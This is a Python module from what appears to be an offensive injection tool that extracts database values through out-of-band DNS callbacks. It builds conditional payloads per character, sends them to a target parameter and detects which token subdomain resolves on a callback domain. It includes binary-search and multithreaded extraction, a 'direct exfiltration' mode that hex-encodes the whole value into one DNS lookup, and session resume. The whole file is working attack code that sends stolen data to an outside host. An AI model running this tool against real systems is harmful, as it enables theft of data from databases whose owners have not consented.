from concurrent.futures import ThreadPoolExecutor, as_completed

from ..session import SessionStore
from ..utils.logging import _hi, _log, _sep
from .dispatch import expand_payloads, load_common, send_payload, send_payloads, token_for


def extract_char_binary(args, profile, request, domain, log, run_id, expression, pos, alphabet):
    risk = getattr(args, "risk", 2)
    chars = sorted(set(alphabet))
    if not chars:
        return None
    lo, hi = 0, len(chars) - 1
    while lo < hi:
        mid = (lo + hi + 1) // 2
        token = f"{run_id}-p{pos:02d}-b{mid:02x}"
        condition = profile.condition_gte(expression, pos, chars[mid])
        send_payloads(args, request, profile.payloads(args.base, condition, f"{token}.{domain}", risk=risk))
        if log.wait_any({token: chars[mid]}, args.timeout):
            lo = mid
        else:
            hi = mid - 1
    # Confirm candidate — absence means end-of-string
    candidate = chars[lo]
    token_eq = f"{run_id}-p{pos:02d}-c{ord(candidate):02x}"
    condition_eq = profile.condition(expression, pos, candidate)
    send_payloads(args, request, profile.payloads(args.base, condition_eq, f"{token_eq}.{domain}", risk=risk))
    return candidate if log.wait_any({token_eq: candidate}, args.timeout) else None


def _extract_value_parallel(args, profile, request, domain, log, run_id, session,
                             extraction_id, expression, alphabet, max_len,
                             partial_result, start_pos):
    results: dict[int, str | None] = {}
    positions = list(range(start_pos, max_len + 1))

    def extract_one(pos: int) -> tuple[int, str | None]:
        if getattr(args, "strategy", "batch") == "binary":
            return pos, extract_char_binary(
                args, profile, request, domain, log, run_id, expression, pos, alphabet
            )
        risk = getattr(args, "risk", 2)
        token_map: dict[str, str] = {}
        for c in alphabet:
            token = token_for(run_id, pos, c)
            token_map[token] = c
            condition = profile.condition(expression, pos, c)
            send_payloads(args, request, profile.payloads(args.base, condition, f"{token}.{domain}", risk=risk))
        token = log.wait_any(token_map, args.timeout)
        return pos, token_map[token] if token else None

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {executor.submit(extract_one, pos): pos for pos in positions}
        for fut in as_completed(futures):
            pos, char = fut.result()
            results[pos] = char

    result = partial_result
    for pos in range(start_pos, max_len + 1):
        char = results.get(pos)
        if not char:
            break
        result += char
        session.save_extraction(
            extraction_id, args.dbms, args.place, args.param,
            expression, alphabet, result, False,
        )
        _log("INFO", f"Pos {pos:02d}: {char}  {result}")

    print()
    _log("INFO", f"Extracted: {_hi(result)}")
    session.save_extraction(
        extraction_id, args.dbms, args.place, args.param,
        expression, alphabet, result, True,
    )
    return result


def _try_direct_extract(args, profile, request, domain, log, run_id, expression) -> str | None:
    """Try to exfiltrate the full value in one DNS hit (HEX in subdomain).
    Returns the decoded value, or None if unsupported or no callback received."""
    prefix = f"{run_id}-d"
    payloads = profile.direct_payloads(args.base, expression, prefix, domain, risk=getattr(args, "risk", 2))
    if not payloads:
        return None

    _log("INFO", "Trying direct exfiltration (full value in one DNS hit)...")
    value = None
    for payload in expand_payloads(args, payloads):
        send_payload(args, request, payload)
        value = log.find_direct(prefix, args.timeout)
        if value is not None:
            break
    if value is not None:
        _log("INFO", _hi(f"Direct: {value}"))
    else:
        _log("DEBUG", "No direct callback — falling back to char-by-char")
    return value


def extract_value(args, expression: str, alphabet: str, max_len: int, show_card: bool = True) -> str:
    profile, request, domain, log, run_id, session = load_common(args)
    extraction_id = session.extraction_id(args.dbms, args.place, args.param, expression, alphabet)
    cached = None if args.fresh_queries else session.get_extraction(extraction_id)
    result = ""
    start_pos = 1

    if cached and cached["completed"]:
        _log("INFO", f"Resumed from session: {_hi(cached['value'])}")
        session.close()
        return cached["value"]

    if cached and cached["value"]:
        result = cached["value"]
        start_pos = len(result) + 1
        _log("INFO", f"Resuming from pos {start_pos}: {result}")

    if show_card:
        _sep()
        print(f"  profile   {profile.name}  |  run {run_id}")
        print(f"  [~] {profile.comment}")
        print(f"  expr      {expression}")
        print(f"  domain    {domain}")
        print(f"  watching  {', '.join(args.log)}")
        print(f"  session   {session.path}")
        _sep()
        print()

    # Try direct exfiltration first (only when starting fresh, not resuming)
    if start_pos == 1:
        direct = _try_direct_extract(args, profile, request, domain, log, run_id, expression)
        if direct is not None:
            session.save_extraction(extraction_id, args.dbms, args.place, args.param, expression, alphabet, direct, True)
            session.close()
            return direct
        if show_card:
            print()

    if getattr(args, "threads", 1) > 1:
        result = _extract_value_parallel(
            args, profile, request, domain, log, run_id, session,
            extraction_id, expression, alphabet, max_len, result, start_pos,
        )
        session.close()
        return result

    for pos in range(start_pos, max_len + 1):
        if getattr(args, "strategy", "batch") == "binary":
            char = extract_char_binary(args, profile, request, domain, log, run_id, expression, pos, alphabet)
        else:
            token_map: dict[str, str] = {}
            for c in alphabet:
                token = token_for(run_id, pos, c)
                token_map[token] = c
                condition = profile.condition(expression, pos, c)
                send_payloads(args, request, profile.payloads(args.base, condition, f"{token}.{domain}", risk=getattr(args, "risk", 2)))
            token = log.wait_any(token_map, args.timeout)
            char = token_map[token] if token else None

        if not char:
            print()
            _log("INFO", f"Extracted: {_hi(result)}")
            session.save_extraction(extraction_id, args.dbms, args.place, args.param, expression, alphabet, result, True)
            session.close()
            return result

        result += char
        session.save_extraction(extraction_id, args.dbms, args.place, args.param, expression, alphabet, result, False)
        _log("INFO", f"Pos {pos:02d}: {char}  {result}")

    print()
    _log("WARNING", f"Max length reached: {_hi(result)}")
    session.save_extraction(extraction_id, args.dbms, args.place, args.param, expression, alphabet, result, False)
    session.close()
    return result
